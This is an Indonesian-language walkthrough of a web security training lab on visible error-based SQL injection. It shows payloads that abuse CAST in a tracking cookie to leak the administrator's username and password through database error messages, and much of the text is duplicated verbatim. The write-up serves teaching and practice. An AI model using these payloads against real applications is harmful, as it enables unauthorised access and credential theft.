Visible error-based SQL injection

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.

---

### **1. Deskripsi Query dan Tujuan**
Tujuan dari eksploitasi ini adalah untuk memanfaatkan **error-based SQL injection** pada parameter `trackingId` guna mendapatkan kredensial pengguna admin (`username` dan `password`) dari tabel `users`.

#### **Query Utama:**
```sql
SELECT trackingId FROM trackingIdTable WHERE trackingId = 'pFNj0VuG3fnTFJ3a';
```

Query ini rentan terhadap **SQL injection** karena tidak ada validasi input, sehingga memungkinkan manipulasi menggunakan payload berbahaya.

---

### **2. Payload dan Penjelasan**
#### **Payload untuk Validasi Awal:**
```sql
pFNj0VuG3fnTFJ3a' AND CAST((SELECT 1) AS int)--
```
- **Tujuan:** Memastikan bahwa aplikasi rentan terhadap SQL injection dengan memanfaatkan fungsi `CAST`.
- **`CAST((SELECT 1) AS int)`**: Mengonversi hasil query menjadi tipe data integer, memicu kesalahan jika input tidak valid.

#### **Payload untuk Mengambil Username:**
```sql
pFNj0VuG3fnTFJ3a' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
```
- **`SELECT username FROM users LIMIT 1`**:
  - Mengambil username pertama dari tabel `users`.
- **`CAST(... AS int)`**:
  - Memaksa aplikasi untuk mencoba mengonversi nilai teks (username) menjadi integer, yang akan menghasilkan pesan error yang dapat diungkapkan kepada penyerang.

#### **Payload untuk Mengambil Password:**
```sql
pFNj0VuG3fnTFJ3a' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
```
- **`SELECT password FROM users LIMIT 1`**:
  - Mengambil password pertama dari tabel `users`.
- **Pesan Error:** Aplikasi memunculkan pesan error yang mengungkapkan data yang tidak bisa dikonversi, seperti `fc9v2vqq5gozvlcb0ibj`.

---

### **3. PoC Langkah demi Langkah**

1. **Payload Awal:**
   Uji aplikasi untuk melihat apakah error dapat dimanipulasi.
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT 1) AS int)--
   ```
   **Hasil:** Aplikasi memunculkan pesan error yang menandakan SQL injection berhasil.

2. **Mengambil Username:**
   Eksploitasi lebih lanjut untuk mengambil username dari tabel `users`.
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
   ```
   **Hasil:** Pesan error aplikasi akan menampilkan username pertama, misalnya `admin`.

3. **Mengambil Password:**
   Gunakan payload berikut untuk mendapatkan password pengguna:
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
   ```
   **Hasil:** Pesan error akan menampilkan password, misalnya `fc9v2vqq5gozvlcb0ibj`.

---

### **4. Penjelasan Detail Query**

#### **1. Query Utama dengan SQL Injection**
- `pFNj0VuG3fnTFJ3a'`:
  - Nilai awal yang valid untuk parameter `trackingId`.
- `AND CAST((SELECT password FROM users LIMIT 1) AS int)--`:
  - Menambahkan pernyataan kondisi tambahan untuk memaksa server menjalankan subquery.
  - Menggunakan komentar `--` untuk mengabaikan sisa query asli.

#### **2. Teknik Error-Based SQL Injection**
- Teknik ini mengeksploitasi pesan error dari fungsi `CAST` untuk mengekstrak data. Saat tipe data tidak sesuai (contoh: mencoba mengubah teks menjadi integer), aplikasi mengungkapkan informasi dari database melalui pesan error.

---

### **5. Kesimpulan**
Dengan memanfaatkan kerentanan error-based SQL injection, penyerang dapat dengan mudah mengekstrak informasi sensitif seperti username dan password dari database. PoC ini membuktikan bahwa kurangnya validasi input adalah risiko keamanan yang serius.

Berikut adalah ilustrasi langkah-langkah eksploitasi untuk mempermudah pemahaman Anda:

1. **Payload Awal**:
   Validasi kerentanan SQL injection.
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT 1) AS int)--
   ```

2. **Mengambil Username**:
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
   ```

3. **Mengambil Password**:
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
   ```
---

### **1. Deskripsi Query dan Tujuan**
Tujuan dari eksploitasi ini adalah untuk memanfaatkan **error-based SQL injection** pada parameter `trackingId` guna mendapatkan kredensial pengguna admin (`username` dan `password`) dari tabel `users`.

#### **Query Utama:**
```sql
SELECT trackingId FROM trackingIdTable WHERE trackingId = 'pFNj0VuG3fnTFJ3a';
```

Query ini rentan terhadap **SQL injection** karena tidak ada validasi input, sehingga memungkinkan manipulasi menggunakan payload berbahaya.

---

### **2. Payload dan Penjelasan**
#### **Payload untuk Validasi Awal:**
```sql
pFNj0VuG3fnTFJ3a' AND CAST((SELECT 1) AS int)--
```
- **Tujuan:** Memastikan bahwa aplikasi rentan terhadap SQL injection dengan memanfaatkan fungsi `CAST`.
- **`CAST((SELECT 1) AS int)`**: Mengonversi hasil query menjadi tipe data integer, memicu kesalahan jika input tidak valid.

#### **Payload untuk Mengambil Username:**
```sql
pFNj0VuG3fnTFJ3a' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
```
- **`SELECT username FROM users LIMIT 1`**:
  - Mengambil username pertama dari tabel `users`.
- **`CAST(... AS int)`**:
  - Memaksa aplikasi untuk mencoba mengonversi nilai teks (username) menjadi integer, yang akan menghasilkan pesan error yang dapat diungkapkan kepada penyerang.

#### **Payload untuk Mengambil Password:**
```sql
pFNj0VuG3fnTFJ3a' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
```
- **`SELECT password FROM users LIMIT 1`**:
  - Mengambil password pertama dari tabel `users`.
- **Pesan Error:** Aplikasi memunculkan pesan error yang mengungkapkan data yang tidak bisa dikonversi, seperti `fc9v2vqq5gozvlcb0ibj`.

---

### **3. PoC Langkah demi Langkah**

1. **Payload Awal:**
   Uji aplikasi untuk melihat apakah error dapat dimanipulasi.
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT 1) AS int)--
   ```
   **Hasil:** Aplikasi memunculkan pesan error yang menandakan SQL injection berhasil.

2. **Mengambil Username:**
   Eksploitasi lebih lanjut untuk mengambil username dari tabel `users`.
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
   ```
   **Hasil:** Pesan error aplikasi akan menampilkan username pertama, misalnya `admin`.

3. **Mengambil Password:**
   Gunakan payload berikut untuk mendapatkan password pengguna:
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
   ```
   **Hasil:** Pesan error akan menampilkan password, misalnya `fc9v2vqq5gozvlcb0ibj`.

---

### **4. Penjelasan Detail Query**

#### **1. Query Utama dengan SQL Injection**
- `pFNj0VuG3fnTFJ3a'`:
  - Nilai awal yang valid untuk parameter `trackingId`.
- `AND CAST((SELECT password FROM users LIMIT 1) AS int)--`:
  - Menambahkan pernyataan kondisi tambahan untuk memaksa server menjalankan subquery.
  - Menggunakan komentar `--` untuk mengabaikan sisa query asli.

#### **2. Teknik Error-Based SQL Injection**
- Teknik ini mengeksploitasi pesan error dari fungsi `CAST` untuk mengekstrak data. Saat tipe data tidak sesuai (contoh: mencoba mengubah teks menjadi integer), aplikasi mengungkapkan informasi dari database melalui pesan error.

---

### **5. Kesimpulan**
Dengan memanfaatkan kerentanan error-based SQL injection, penyerang dapat dengan mudah mengekstrak informasi sensitif seperti username dan password dari database. PoC ini membuktikan bahwa kurangnya validasi input adalah risiko keamanan yang serius.

Berikut adalah ilustrasi langkah-langkah eksploitasi untuk mempermudah pemahaman Anda:

1. **Payload Awal**:
   Validasi kerentanan SQL injection.
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT 1) AS int)--
   ```

2. **Mengambil Username**:
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
   ```

3. **Mengambil Password**:
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
   ```
